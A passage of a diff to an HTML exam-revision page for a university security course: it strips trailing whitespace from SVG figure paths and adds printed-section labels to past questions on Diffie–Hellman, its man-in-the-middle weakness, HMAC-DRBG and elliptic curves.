+Q 407.608904 124.14 291.093924 124.14
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-6-pba7d367ae1)" d="M 296.293924 126.74 
-L 291.093924 124.14 
-L 296.293924 121.54 
-L 296.293924 126.74 
+<path clip-path="url(#fig-6-pba7d367ae1)" d="M 296.293924 126.74
+L 291.093924 124.14
+L 296.293924 121.54
+L 296.293924 126.74
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-6-patch_5">
-<path clip-path="url(#fig-6-pba7d367ae1)" d="M 285.637327 158.328 
-Q 167.668904 158.328 51.153924 158.328 
+<path clip-path="url(#fig-6-pba7d367ae1)" d="M 285.637327 158.328
+Q 167.668904 158.328 51.153924 158.328
 " style="fill: none; stroke: #aa3d46; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-6-pba7d367ae1)" d="M 56.353924 160.928 
-L 51.153924 158.328 
-L 56.353924 155.728 
-L 56.353924 160.928 
+<path clip-path="url(#fig-6-pba7d367ae1)" d="M 56.353924 160.928
+L 51.153924 158.328
+L 56.353924 155.728
+L 56.353924 160.928
 z
 " style="fill: #aa3d46; stroke: #aa3d46; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-6-patch_6">
-<path clip-path="url(#fig-6-pba7d367ae1)" d="M 49.702673 192.516 
-Q 167.671096 192.516 284.186076 192.516 
+<path clip-path="url(#fig-6-pba7d367ae1)" d="M 49.702673 192.516
+Q 167.671096 192.516 284.186076 192.516
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-6-pba7d367ae1)" d="M 278.986076 189.916 
-L 284.186076 192.516 
-L 278.986076 195.116 
-L 278.986076 189.916 
+<path clip-path="url(#fig-6-pba7d367ae1)" d="M 278.986076 189.916
+L 284.186076 192.516
+L 278.986076 195.116
+L 278.986076 189.916
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-6-patch_7">
-<path clip-path="url(#fig-6-pba7d367ae1)" d="M 289.642673 226.704 
-Q 407.611096 226.704 524.126076 226.704 
+<path clip-path="url(#fig-6-pba7d367ae1)" d="M 289.642673 226.704
+Q 407.611096 226.704 524.126076 226.704
 " style="fill: none; stroke: #aa3d46; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-6-pba7d367ae1)" d="M 518.926076 224.104 
-L 524.126076 226.704 
-L 518.926076 229.304 
-L 518.926076 224.104 
+<path clip-path="url(#fig-6-pba7d367ae1)" d="M 518.926076 224.104
+L 524.126076 226.704
+L 518.926076 229.304
+L 518.926076 224.104
 z
 " style="fill: #aa3d46; stroke: #aa3d46; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-6-line2d_1">
-<path clip-path="url(#fig-6-pba7d367ae1)" d="M 47.7 258.12 
-L 47.7 39.132 
+<path clip-path="url(#fig-6-pba7d367ae1)" d="M 47.7 258.12
+L 47.7 39.132
 " style="fill: none; stroke-dasharray: 3.7,1.6; stroke-dashoffset: 0; stroke: #bac8d5"></path>
 </g>
 <g id="fig-6-line2d_2">
-<path clip-path="url(#fig-6-pba7d367ae1)" d="M 287.64 258.12 
-L 287.64 39.132 
+<path clip-path="url(#fig-6-pba7d367ae1)" d="M 287.64 258.12
+L 287.64 39.132
 " style="fill: none; stroke-dasharray: 3.7,1.6; stroke-dashoffset: 0; stroke: #bac8d5"></path>
 </g>
 <g id="fig-6-line2d_3">
-<path clip-path="url(#fig-6-pba7d367ae1)" d="M 527.58 258.12 
-L 527.58 39.132 
+<path clip-path="url(#fig-6-pba7d367ae1)" d="M 527.58 258.12
+L 527.58 39.132
 " style="fill: none; stroke-dasharray: 3.7,1.6; stroke-dashoffset: 0; stroke: #bac8d5"></path>
 </g>
 <g id="fig-6-text_1">
@@ -1940,7 +1940,7 @@ L 527.58 39.132
 <p><a id="s17"></a></p>
 </section><section class="question"><h3>S17 · 2022–23 · Q6(a)</h3>
 <p><strong>Authenticate Diffie–Hellman with RSA signatures · 15 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=13">root question PDF, page 13</a>. Sitting date: 18 April 2024.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=13">root question PDF, page 13</a>. Sitting date: 18 April 2024. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Explain Diffie–Hellman and its MITM security flaw with figures. Modify the algorithm using RSA digital signatures to remove that flaw.</p>
 </blockquote>
@@ -1965,93 +1965,93 @@ L 527.58 39.132
 </defs>
 <g id="fig-7-figure_1">
 <g id="fig-7-patch_1">
-<path d="M 0 294.48 
-L 575.28 294.48 
-L 575.28 0 
-L 0 0 
+<path d="M 0 294.48
+L 575.28 294.48
+L 575.28 0
+L 0 0
 z
 " style="fill: #ffffff"></path>
 </g>
 <g id="fig-7-axes_1">
 <g id="fig-7-patch_2">
-<path clip-path="url(#fig-7-pba7d367ae1)" d="M 49.702673 55.764 
-Q 167.671096 55.764 284.186076 55.764 
+<path clip-path="url(#fig-7-pba7d367ae1)" d="M 49.702673 55.764
+Q 167.671096 55.764 284.186076 55.764
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-7-pba7d367ae1)" d="M 278.986076 53.164 
-L 284.186076 55.764 
-L 278.986076 58.364 
-L 278.986076 53.164 
+<path clip-path="url(#fig-7-pba7d367ae1)" d="M 278.986076 53.164
+L 284.186076 55.764
+L 278.986076 58.364
+L 278.986076 53.164
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-7-patch_3">
-<path clip-path="url(#fig-7-pba7d367ae1)" d="M 289.642673 89.952 
-Q 407.611096 89.952 524.126076 89.952 
+<path clip-path="url(#fig-7-pba7d367ae1)" d="M 289.642673 89.952
+Q 407.611096 89.952 524.126076 89.952
 " style="fill: none; stroke: #aa3d46; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-7-pba7d367ae1)" d="M 518.926076 87.352 
-L 524.126076 89.952 
-L 518.926076 92.552 
-L 518.926076 87.352 
+<path clip-path="url(#fig-7-pba7d367ae1)" d="M 518.926076 87.352
+L 524.126076 89.952
+L 518.926076 92.552
+L 518.926076 87.352
 z
 " style="fill: #aa3d46; stroke: #aa3d46; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-7-patch_4">
-<path clip-path="url(#fig-7-pba7d367ae1)" d="M 525.577327 124.14 
-Q 407.608904 124.14 291.093924 124.14 
+<path clip-path="url(#fig-7-pba7d367ae1)" d="M 525.577327 124.14
+Q 407.608904 124.14 291.093924 124.14
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-7-pba7d367ae1)" d="M 296.293924 126.74 
-L 291.093924 124.14 
-L 296.293924 121.54 
-L 296.293924 126.74 
+<path clip-path="url(#fig-7-pba7d367ae1)" d="M 296.293924 126.74
+L 291.093924 124.14
+L 296.293924 121.54
+L 296.293924 126.74
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-7-patch_5">
-<path clip-path="url(#fig-7-pba7d367ae1)" d="M 285.637327 158.328 
-Q 167.668904 158.328 51.153924 158.328 
+<path clip-path="url(#fig-7-pba7d367ae1)" d="M 285.637327 158.328
+Q 167.668904 158.328 51.153924 158.328
 " style="fill: none; stroke: #aa3d46; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-7-pba7d367ae1)" d="M 56.353924 160.928 
-L 51.153924 158.328 
-L 56.353924 155.728 
-L 56.353924 160.928 
+<path clip-path="url(#fig-7-pba7d367ae1)" d="M 56.353924 160.928
+L 51.153924 158.328
+L 56.353924 155.728
+L 56.353924 160.928
 z
 " style="fill: #aa3d46; stroke: #aa3d46; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-7-patch_6">
-<path clip-path="url(#fig-7-pba7d367ae1)" d="M 49.702673 192.516 
-Q 167.671096 192.516 284.186076 192.516 
+<path clip-path="url(#fig-7-pba7d367ae1)" d="M 49.702673 192.516
+Q 167.671096 192.516 284.186076 192.516
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-7-pba7d367ae1)" d="M 278.986076 189.916 
-L 284.186076 192.516 
-L 278.986076 195.116 
-L 278.986076 189.916 
+<path clip-path="url(#fig-7-pba7d367ae1)" d="M 278.986076 189.916
+L 284.186076 192.516
+L 278.986076 195.116
+L 278.986076 189.916
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-7-patch_7">
-<path clip-path="url(#fig-7-pba7d367ae1)" d="M 289.642673 226.704 
-Q 407.611096 226.704 524.126076 226.704 
+<path clip-path="url(#fig-7-pba7d367ae1)" d="M 289.642673 226.704
+Q 407.611096 226.704 524.126076 226.704
 " style="fill: none; stroke: #aa3d46; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-7-pba7d367ae1)" d="M 518.926076 224.104 
-L 524.126076 226.704 
-L 518.926076 229.304 
-L 518.926076 224.104 
+<path clip-path="url(#fig-7-pba7d367ae1)" d="M 518.926076 224.104
+L 524.126076 226.704
+L 518.926076 229.304
+L 518.926076 224.104
 z
 " style="fill: #aa3d46; stroke: #aa3d46; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-7-line2d_1">
-<path clip-path="url(#fig-7-pba7d367ae1)" d="M 47.7 258.12 
-L 47.7 39.132 
+<path clip-path="url(#fig-7-pba7d367ae1)" d="M 47.7 258.12
+L 47.7 39.132
 " style="fill: none; stroke-dasharray: 3.7,1.6; stroke-dashoffset: 0; stroke: #bac8d5"></path>
 </g>
 <g id="fig-7-line2d_2">
-<path clip-path="url(#fig-7-pba7d367ae1)" d="M 287.64 258.12 
-L 287.64 39.132 
+<path clip-path="url(#fig-7-pba7d367ae1)" d="M 287.64 258.12
+L 287.64 39.132
 " style="fill: none; stroke-dasharray: 3.7,1.6; stroke-dashoffset: 0; stroke: #bac8d5"></path>
 </g>
 <g id="fig-7-line2d_3">
-<path clip-path="url(#fig-7-pba7d367ae1)" d="M 527.58 258.12 
-L 527.58 39.132 
+<path clip-path="url(#fig-7-pba7d367ae1)" d="M 527.58 258.12
+L 527.58 39.132
 " style="fill: none; stroke-dasharray: 3.7,1.6; stroke-dashoffset: 0; stroke: #bac8d5"></path>
 </g>
 <g id="fig-7-text_1">
@@ -2158,7 +2158,7 @@ L 527.58 39.132
 <p><a id="s19"></a></p>
 </section><section class="question"><h3>S19 · 2022–23 · Q6(c)</h3>
 <p><strong>HMAC-DRBG generation, security and rollback resistance · 10 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=13">root question PDF, page 13</a>. Sitting date: 18 April 2024.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=13">root question PDF, page 13</a>. Sitting date: 18 April 2024. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Describe how HMAC-DRBG generates pseudorandom numbers and why it is secure and rollback resistant, assuming secure HMAC.</p>
 </blockquote>
@@ -2186,7 +2186,7 @@ Generate(n):
 <p><a id="s29"></a></p>
 </section><section class="question"><h3>S29 · 2021–22 · Q2(b)</h3>
 <p><strong>Compute an elliptic-curve point group · 10 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=15">root question PDF, page 15</a>. Sitting date: 30 October 2023.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=15">root question PDF, page 15</a>. Sitting date: 30 October 2023. Printed Section A.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Explain elliptic-curve cryptographic applications. Find the group of points E11(1,6), with y²=x³+x+6 mod 11.</p>
 </blockquote>
@@ -2285,33 +2285,33 @@ Generate(n):
 </defs>
 <g id="fig-8-figure_1">
 <g id="fig-8-patch_1">
-<path d="M 0 276.273812 
-L 370.983438 276.273812 
-L 370.983438 0 
-L 0 0 
+<path d="M 0 276.273812
+L 370.983438 276.273812
+L 370.983438 0
+L 0 0
 z
 " style="fill: #ffffff"></path>
 </g>
 <g id="fig-8-axes_1">
 <g id="fig-8-patch_2">
-<path d="M 44.283438 235.341937 
-L 362.343437 235.341937 
-L 362.343437 24.669937 
-L 44.283438 24.669937 
+<path d="M 44.283438 235.341937
+L 362.343437 235.341937
+L 362.343437 24.669937
+L 44.283438 24.669937
 z
 " style="fill: #ffffff"></path>
 </g>
 <g id="fig-8-PathCollection_1">
 <defs>
-<path d="M 0 3.872983 
-C 1.027127 3.872983 2.012324 3.464901 2.738613 2.738613 
-C 3.464901 2.012324 3.872983 1.027127 3.872983 0 
-C 3.872983 -1.027127 3.464901 -2.012324 2.738613 -2.738613 
-C 2.012324 -3.464901 1.027127 -3.872983 0 -3.872983 
-C -1.027127 -3.872983 -2.012324 -3.464901 -2.738613 -2.738613 
-C -3.464901 -2.012324 -3.872983 -1.027127 -3.872983 0 
-C -3.872983 1.027127 -3.464901 2.012324 -2.738613 2.738613 
-C -2.012324 3.464901 -1.027127 3.872983 0 3.872983 
+<path d="M 0 3.872983
+C 1.027127 3.872983 2.012324 3.464901 2.738613 2.738613
+C 3.464901 2.012324 3.872983 1.027127 3.872983 0
+C 3.872983 -1.027127 3.464901 -2.012324 2.738613 -2.738613
+C 2.012324 -3.464901 1.027127 -3.872983 0 -3.872983
+C -1.027127 -3.872983 -2.012324 -3.464901 -2.738613 -2.738613
+C -3.464901 -2.012324 -3.872983 -1.027127 -3.872983 0
+C -3.872983 1.027127 -3.464901 2.012324 -2.738613 2.738613
+C -2.012324 3.464901 -1.027127 3.872983 0 3.872983
 z
 " id="fig-8-me4491f9a0c" style="stroke: #244a75"></path>
 </defs>
@@ -2333,14 +2333,14 @@ z
 <g id="fig-8-matplotlib.axis_1">
 <g id="fig-8-xtick_1">
 <g id="fig-8-line2d_1">
-<path clip-path="url(#fig-8-p60020a5427)" d="M 44.283438 235.341937 
-L 44.283438 24.669937 
+<path clip-path="url(#fig-8-p60020a5427)" d="M 44.283438 235.341937
+L 44.283438 24.669937
 " style="fill: none; stroke: #b0b0b0; stroke-opacity: 0.2; stroke-width: 0.8; stroke-linecap: square"></path>
 </g>
 <g id="fig-8-line2d_2">
 <defs>
-<path d="M 0 0 
-L 0 3.5 
+<path d="M 0 0
+L 0 3.5
 " id="fig-8-m17418859be" style="stroke: #000000; stroke-width: 0.8"></path>
 </defs>
 <g>
@@ -2353,8 +2353,8 @@ L 0 3.5
 </g>
 <g id="fig-8-xtick_2">
 <g id="fig-8-line2d_3">
-<path clip-path="url(#fig-8-p60020a5427)" d="M 74.86613 235.341937 
-L 74.86613 24.669937 
+<path clip-path="url(#fig-8-p60020a5427)" d="M 74.86613 235.341937
+L 74.86613 24.669937
 " style="fill: none; stroke: #b0b0b0; stroke-opacity: 0.2; stroke-width: 0.8; stroke-linecap: square"></path>
 </g>
 <g id="fig-8-line2d_4">
@@ -2368,8 +2368,8 @@ L 74.86613 24.669937
 </g>
 <g id="fig-8-xtick_3">
 <g id="fig-8-line2d_5">
-<path clip-path="url(#fig-8-p60020a5427)" d="M 105.448822 235.341937 
-L 105.448822 24.669937 
+<path clip-path="url(#fig-8-p60020a5427)" d="M 105.448822 235.341937
+L 105.448822 24.669937
 " style="fill: none; stroke: #b0b0b0; stroke-opacity: 0.2; stroke-width: 0.8; stroke-linecap: square"></path>
 </g>
 <g id="fig-8-line2d_6">
@@ -2383,8 +2383,8 @@ L 105.448822 24.669937
 </g>
 <g id="fig-8-xtick_4">
 <g id="fig-8-line2d_7">
-<path clip-path="url(#fig-8-p60020a5427)" d="M 136.031514 235.341937 
-L 136.031514 24.669937 
+<path clip-path="url(#fig-8-p60020a5427)" d="M 136.031514 235.341937
+L 136.031514 24.669937
 " style="fill: none; stroke: #b0b0b0; stroke-opacity: 0.2; stroke-width: 0.8; stroke-linecap: square"></path>
 </g>
 <g id="fig-8-line2d_8">
@@ -2398,8 +2398,8 @@ L 136.031514 24.669937
 </g>
 <g id="fig-8-xtick_5">
 <g id="fig-8-line2d_9">
-<path clip-path="url(#fig-8-p60020a5427)" d="M 166.614207 235.341937 
-L 166.614207 24.669937 
+<path clip-path="url(#fig-8-p60020a5427)" d="M 166.614207 235.341937
+L 166.614207 24.669937
 " style="fill: none; stroke: #b0b0b0; stroke-opacity: 0.2; stroke-width: 0.8; stroke-linecap: square"></path>
 </g>
 <g id="fig-8-line2d_10">
@@ -2413,8 +2413,8 @@ L 166.614207 24.669937
 </g>
 <g id="fig-8-xtick_6">
 <g id="fig-8-line2d_11">
-<path clip-path="url(#fig-8-p60020a5427)" d="M 197.196899 235.341937 
-L 197.196899 24.669937 
+<path clip-path="url(#fig-8-p60020a5427)" d="M 197.196899 235.341937
+L 197.196899 24.669937
 " style="fill: none; stroke: #b0b0b0; stroke-opacity: 0.2; stroke-width: 0.8; stroke-linecap: square"></path>
 </g>
 <g id="fig-8-line2d_12">
@@ -2428,8 +2428,8 @@ L 197.196899 24.669937
 </g>
 <g id="fig-8-xtick_7">
 <g id="fig-8-line2d_13">
-<path clip-path="url(#fig-8-p60020a5427)" d="M 227.779591 235.341937 
-L 227.779591 24.669937 
+<path clip-path="url(#fig-8-p60020a5427)" d="M 227.779591 235.341937
+L 227.779591 24.669937
 " style="fill: none; stroke: #b0b0b0; stroke-opacity: 0.2; stroke-width: 0.8; stroke-linecap: square"></path>
 </g>
 <g id="fig-8-line2d_14">
@@ -2443,8 +2443,8 @@ L 227.779591 24.669937
 </g>
 <g id="fig-8-xtick_8">
 <g id="fig-8-line2d_15">
-<path clip-path="url(#fig-8-p60020a5427)" d="M 258.362284 235.341937 
-L 258.362284 24.669937 
+<path clip-path="url(#fig-8-p60020a5427)" d="M 258.362284 235.341937
+L 258.362284 24.669937
 " style="fill: none; stroke: #b0b0b0; stroke-opacity: 0.2; stroke-width: 0.8; stroke-linecap: square"></path>
 </g>
 <g id="fig-8-line2d_16">
@@ -2458,8 +2458,8 @@ L 258.362284 24.669937
 </g>
 <g id="fig-8-xtick_9">
 <g id="fig-8-line2d_17">
-<path clip-path="url(#fig-8-p60020a5427)" d="M 288.944976 235.341937 
-L 288.944976 24.669937 
+<path clip-path="url(#fig-8-p60020a5427)" d="M 288.944976 235.341937
+L 288.944976 24.669937
 " style="fill: none; stroke: #b0b0b0; stroke-opacity: 0.2; stroke-width: 0.8; stroke-linecap: square"></path>
 </g>
 <g id="fig-8-line2d_18">
@@ -2473,8 +2473,8 @@ L 288.944976 24.669937
 </g>
 <g id="fig-8-xtick_10">
 <g id="fig-8-line2d_19">
-<path clip-path="url(#fig-8-p60020a5427)" d="M 319.527668 235.341937 
-L 319.527668 24.669937 
+<path clip-path="url(#fig-8-p60020a5427)" d="M 319.527668 235.341937
+L 319.527668 24.669937
 " style="fill: none; stroke: #b0b0b0; stroke-opacity: 0.2; stroke-width: 0.8; stroke-linecap: square"></path>
 </g>
 <g id="fig-8-line2d_20">
@@ -2488,8 +2488,8 @@ L 319.527668 24.669937
 </g>
 <g id="fig-8-xtick_11">
 <g id="fig-8-line2d_21">
-<path clip-path="url(#fig-8-p60020a5427)" d="M 350.110361 235.341937 
-L 350.110361 24.669937 
+<path clip-path="url(#fig-8-p60020a5427)" d="M 350.110361 235.341937
+L 350.110361 24.669937
 " style="fill: none; stroke: #b0b0b0; stroke-opacity: 0.2; stroke-width: 0.8; stroke-linecap: square"></path>
 </g>
 <g id="fig-8-line2d_22">
@@ -2508,14 +2508,14 @@ L 350.110361 24.669937
 <g id="fig-8-matplotlib.axis_2">
 <g id="fig-8-ytick_1">
 <g id="fig-8-line2d_23">
-<path clip-path="url(#fig-8-p60020a5427)" d="M 44.283438 235.341937 
-L 362.343437 235.341937 
+<path clip-path="url(#fig-8-p60020a5427)" d="M 44.283438 235.341937
+L 362.343437 235.341937
 " style="fill: none; stroke: #b0b0b0; stroke-opacity: 0.2; stroke-width: 0.8; stroke-linecap: square"></path>
 </g>
 <g id="fig-8-line2d_24">
 <defs>
-<path d="M 0 0 
-L -3.5 0 
+<path d="M 0 0
+L -3.5 0
 " id="fig-8-m9840e076e8" style="stroke: #000000; stroke-width: 0.8"></path>
 </defs>
 <g>
@@ -2528,8 +2528,8 @@ L -3.5 0
 </g>
 <g id="fig-8-ytick_2">
 <g id="fig-8-line2d_25">
-<path clip-path="url(#fig-8-p60020a5427)" d="M 44.283438 214.274737 
-L 362.343437 214.274737 
+<path clip-path="url(#fig-8-p60020a5427)" d="M 44.283438 214.274737
+L 362.343437 214.274737
 " style="fill: none; stroke: #b0b0b0; stroke-opacity: 0.2; stroke-width: 0.8; stroke-linecap: square"></path>
 </g>
 <g id="fig-8-line2d_26">
@@ -2543,8 +2543,8 @@ L 362.343437 214.274737
 </g>
 <g id="fig-8-ytick_3">
 <g id="fig-8-line2d_27">
-<path clip-path="url(#fig-8-p60020a5427)" d="M 44.283438 193.207537 
-L 362.343437 193.207537 
+<path clip-path="url(#fig-8-p60020a5427)" d="M 44.283438 193.207537
+L 362.343437 193.207537
 " style="fill: none; stroke: #b0b0b0; stroke-opacity: 0.2; stroke-width: 0.8; stroke-linecap: square"></path>
 </g>
 <g id="fig-8-line2d_28">
@@ -2558,8 +2558,8 @@ L 362.343437 193.207537
 </g>
 <g id="fig-8-ytick_4">
 <g id="fig-8-line2d_29">
-<path clip-path="url(#fig-8-p60020a5427)" d="M 44.283438 172.140337 
-L 362.343437 172.140337 
+<path clip-path="url(#fig-8-p60020a5427)" d="M 44.283438 172.140337
+L 362.343437 172.140337
 " style="fill: none; stroke: #b0b0b0; stroke-opacity: 0.2; stroke-width: 0.8; stroke-linecap: square"></path>
 </g>
 <g id="fig-8-line2d_30">
@@ -2573,8 +2573,8 @@ L 362.343437 172.140337
 </g>
 <g id="fig-8-ytick_5">
 <g id="fig-8-line2d_31">
-<path clip-path="url(#fig-8-p60020a5427)" d="M 44.283438 151.073137 
-L 362.343437 151.073137 
+<path clip-path="url(#fig-8-p60020a5427)" d="M 44.283438 151.073137
+L 362.343437 151.073137
 " style="fill: none; stroke: #b0b0b0; stroke-opacity: 0.2; stroke-width: 0.8; stroke-linecap: square"></path>
 </g>
 <g id="fig-8-line2d_32">
@@ -2588,8 +2588,8 @@ L 362.343437 151.073137
 </g>
 <g id="fig-8-ytick_6">
 <g id="fig-8-line2d_33">
-<path clip-path="url(#fig-8-p60020a5427)" d="M 44.283438 130.005937 
-L 362.343437 130.005937 
+<path clip-path="url(#fig-8-p60020a5427)" d="M 44.283438 130.005937
+L 362.343437 130.005937
 " style="fill: none; stroke: #b0b0b0; stroke-opacity: 0.2; stroke-width: 0.8; stroke-linecap: square"></path>
 </g>
 <g id="fig-8-line2d_34">
@@ -2603,8 +2603,8 @@ L 362.343437 130.005937
 </g>
 <g id="fig-8-ytick_7">
 <g id="fig-8-line2d_35">
-<path clip-path="url(#fig-8-p60020a5427)" d="M 44.283438 108.938737 
-L 362.343437 108.938737 
+<path clip-path="url(#fig-8-p60020a5427)" d="M 44.283438 108.938737
+L 362.343437 108.938737
 " style="fill: none; stroke: #b0b0b0; stroke-opacity: 0.2; stroke-width: 0.8; stroke-linecap: square"></path>
 </g>
 <g id="fig-8-line2d_36">
@@ -2618,8 +2618,8 @@ L 362.343437 108.938737
 </g>
 <g id="fig-8-ytick_8">
 <g id="fig-8-line2d_37">
-<path clip-path="url(#fig-8-p60020a5427)" d="M 44.283438 87.871537 
-L 362.343437 87.871537 
+<path clip-path="url(#fig-8-p60020a5427)" d="M 44.283438 87.871537
+L 362.343437 87.871537
 " style="fill: none; stroke: #b0b0b0; stroke-opacity: 0.2; stroke-width: 0.8; stroke-linecap: square"></path>
 </g>
 <g id="fig-8-line2d_38">
@@ -2633,8 +2633,8 @@ L 362.343437 87.871537
 </g>
 <g id="fig-8-ytick_9">
 <g id="fig-8-line2d_39">
-<path clip-path="url(#fig-8-p60020a5427)" d="M 44.283438 66.804337 
-L 362.343437 66.804337 
+<path clip-path="url(#fig-8-p60020a5427)" d="M 44.283438 66.804337
+L 362.343437 66.804337
 " style="fill: none; stroke: #b0b0b0; stroke-opacity: 0.2; stroke-width: 0.8; stroke-linecap: square"></path>
 </g>
 <g id="fig-8-line2d_40">
@@ -2648,8 +2648,8 @@ L 362.343437 66.804337
 </g>
 <g id="fig-8-ytick_10">
 <g id="fig-8-line2d_41">
-<path clip-path="url(#fig-8-p60020a5427)" d="M 44.283438 45.737137 
-L 362.343437 45.737137 
+<path clip-path="url(#fig-8-p60020a5427)" d="M 44.283438 45.737137
+L 362.343437 45.737137
 " style="fill: none; stroke: #b0b0b0; stroke-opacity: 0.2; stroke-width: 0.8; stroke-linecap: square"></path>
 </g>
 <g id="fig-8-line2d_42">
@@ -2663,8 +2663,8 @@ L 362.343437 45.737137
 </g>
 <g id="fig-8-ytick_11">
 <g id="fig-8-line2d_43">
-<path clip-path="url(#fig-8-p60020a5427)" d="M 44.283438 24.669937 
-L 362.343437 24.669937 
+<path clip-path="url(#fig-8-p60020a5427)" d="M 44.283438 24.669937
+L 362.343437 24.669937
 " style="fill: none; stroke: #b0b0b0; stroke-opacity: 0.2; stroke-width: 0.8; stroke-linecap: square"></path>
 </g>
 <g id="fig-8-line2d_44">
@@ -2681,23 +2681,23 @@ L 362.343437 24.669937
 </g>
 </g>
 <g id="fig-8-patch_3">
-<path d="M 44.283438 235.341937 
-L 44.283438 24.669937 
+<path d="M 44.283438 235.341937
+L 44.283438 24.669937
 " style="fill: none; stroke: #000000; stroke-width: 0.8; stroke-linejoin: miter; stroke-linecap: square"></path>
 </g>
 <g id="fig-8-patch_4">
-<path d="M 362.343437 235.341937 
-L 362.343437 24.669937 
+<path d="M 362.343437 235.341937
+L 362.343437 24.669937
 " style="fill: none; stroke: #000000; stroke-width: 0.8; stroke-linejoin: miter; stroke-linecap: square"></path>
 </g>
 <g id="fig-8-patch_5">
-<path d="M 44.283438 235.341937 
-L 362.343437 235.341937 
+<path d="M 44.283438 235.341937
+L 362.343437 235.341937
 " style="fill: none; stroke: #000000; stroke-width: 0.8; stroke-linejoin: miter; stroke-linecap: square"></path>
 </g>
 <g id="fig-8-patch_6">
-<path d="M 44.283438 24.669937 
-L 362.343437 24.669937 
+<path d="M 44.283438 24.669937
+L 362.343437 24.669937
 " style="fill: none; stroke: #000000; stroke-width: 0.8; stroke-linejoin: miter; stroke-linecap: square"></path>
 </g>
 <g id="fig-8-text_25">
@@ -2714,7 +2714,7 @@ L 362.343437 24.669937
 <p><a id="s30"></a></p>
 </section><section class="question"><h3>S30 · 2021–22 · Q2(c)</h3>
 <p><strong>Numerical Diffie–Hellman exchange · 10 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=15">root question PDF, page 15</a>. Sitting date: 30 October 2023.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=15">root question PDF, page 15</a>. Sitting date: 30 October 2023. Printed Section A.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Explain Diffie–Hellman. Given p=353, primitive root g=3, and private exponents 97 and 233, calculate both public keys and the shared secret.</p>
 </blockquote>
@@ -2758,7 +2758,7 @@ L 362.343437 24.669937
 <p><a id="s57"></a></p>
 </section><section class="question"><h3>S57 · 2019–20 · Q8(b)</h3>
 <p><strong>Diffie–Hellman steps and active MITM · 15 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=24">root question PDF, page 24</a>. Sitting date: 07 September 2021.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=24">root question PDF, page 24</a>. Sitting date: 07 September 2021. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Write the Diffie–Hellman key-exchange steps and show the MITM attack when an adversary can intercept and modify messages.</p>
 </blockquote>
@@ -2784,93 +2784,93 @@ L 362.343437 24.669937
 </defs>
 <g id="fig-9-figure_1">
 <g id="fig-9-patch_1">
-<path d="M 0 294.48 
-L 575.28 294.48 
-L 575.28 0 
-L 0 0 
+<path d="M 0 294.48
+L 575.28 294.48
+L 575.28 0
+L 0 0
 z
 " style="fill: #ffffff"></path>
 </g>
 <g id="fig-9-axes_1">
 <g id="fig-9-patch_2">
-<path clip-path="url(#fig-9-pba7d367ae1)" d="M 49.702673 55.764 
-Q 167.671096 55.764 284.186076 55.764 
+<path clip-path="url(#fig-9-pba7d367ae1)" d="M 49.702673 55.764
+Q 167.671096 55.764 284.186076 55.764
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-9-pba7d367ae1)" d="M 278.986076 53.164 
-L 284.186076 55.764 
-L 278.986076 58.364 
-L 278.986076 53.164 
+<path clip-path="url(#fig-9-pba7d367ae1)" d="M 278.986076 53.164
+L 284.186076 55.764
+L 278.986076 58.364
+L 278.986076 53.164
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-9-patch_3">
-<path clip-path="url(#fig-9-pba7d367ae1)" d="M 289.642673 89.952 
-Q 407.611096 89.952 524.126076 89.952 
+<path clip-path="url(#fig-9-pba7d367ae1)" d="M 289.642673 89.952
+Q 407.611096 89.952 524.126076 89.952
 " style="fill: none; stroke: #aa3d46; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-9-pba7d367ae1)" d="M 518.926076 87.352 
